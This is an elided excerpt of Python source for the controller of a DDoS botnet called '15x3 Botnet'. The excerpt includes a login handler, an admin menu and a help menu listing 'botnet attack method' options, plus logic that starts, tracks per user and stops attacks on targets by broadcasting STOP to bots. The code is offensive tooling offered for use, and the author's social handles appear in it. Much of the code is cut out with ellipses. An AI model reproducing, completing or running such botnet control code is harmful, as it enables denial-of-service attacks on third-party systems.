...
banner3 = '''
    \033[1;34m _______  \033[1;31m__   __  ______    _______  __    _  _______  _______ 
    \033[1;34m|       |\033[1;31|  | |  ||    _ |  |       ||  |  | ||       ||       |
    \033[1;34m|    _  |\033[1;31|  | |  ||   | ||  |    ___||   |_| ||    ___||_     _|
    \033[1;34m|   |_| |\033[1;31|  |_|  ||   |_||_ |   |___ |       ||   |___   |   |  
    \033[1;34m|    ___|\033[1;31|       ||    __  ||    ___||  _    ||    ___|  |   |  
    \033[1;34m|   |    \033[1;31|       ||   |  | ||   |___ | | |   ||   |___   |   |  
    \033[1;34m|___|    \033[1;31|_______||___|  |_||_______||_|  |__||_______|  |___|  
    \033[0m
'''
admin_commands = f"""
{gray}Admin Commands:
...
def TargetIsAlreadySent(target, username):
    ...
    # ── 2. helper: broadcast a stop only to bots ───────────────────────────
def broadcast_stop():
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, 'STOP', False, False)          # <<< NEW
        except:
...
def update_title(client, name):
    titles = [
        '1', '15', '15x', '15x3', '15x3 B', '15x3 Bo', '15x3 Bot', '15x3 Botn', '15x3 Botnet',
        '15x3 Botnet', '15x3 Botne', '15x3 Botn', '15x3 Bot', '15x3 Bo', '15x3 B', '15x3', '15', '1'
        ]
    while True:
        try:
            for title in titles:
...
def command_line(client, username):
    ...
    prompt = f'{Fore.LIGHTRED_EX}15x3{Fore.LIGHTBLUE_EX}$ '
    ...
    while 1:
        try:
            ...
            if command == 'HELP' or command == '?' or command == 'COMMANDS':
                ...
                send(client, f'{C}METHODS{gray}             Shows list of botnet attack method')
            ...
            elif command == '.STOP':         # ← aligns with other elifs
                if username in attacks:
                    broadcast_stop()
                    target = attacks[username]['target']
                    attacks.pop(username, None)
                    send(client, f'{G}Stopped attack against {target}\n')
                else:
                    send(client, Fore.RED + 'You have no active attack to stop.\n')
                ...
                send(client, f'\n{B}Instagram{gray}: {Q}anas15x3')
                send(client, f'{B}Telegram{gray}: {Q}anas15x3')
                send(client, f'{B}Discord{gray}:  {Q}carlrafael.9')
                send(client, f'{B}GitHub{gray}:   {Q}anaslmzebeb')
...
{gray}> {lightwhite}Duration {gray}: {lightwhite}{secs}{gray}'''
                                            ...
                                            send(client, Fore.RED + "Attack already sent! Matspamich azbi\n")
                                    else:
...
def handle_client(client, address):
    send(client, f'\33]0;15x3 Botnet | Login\a', False)
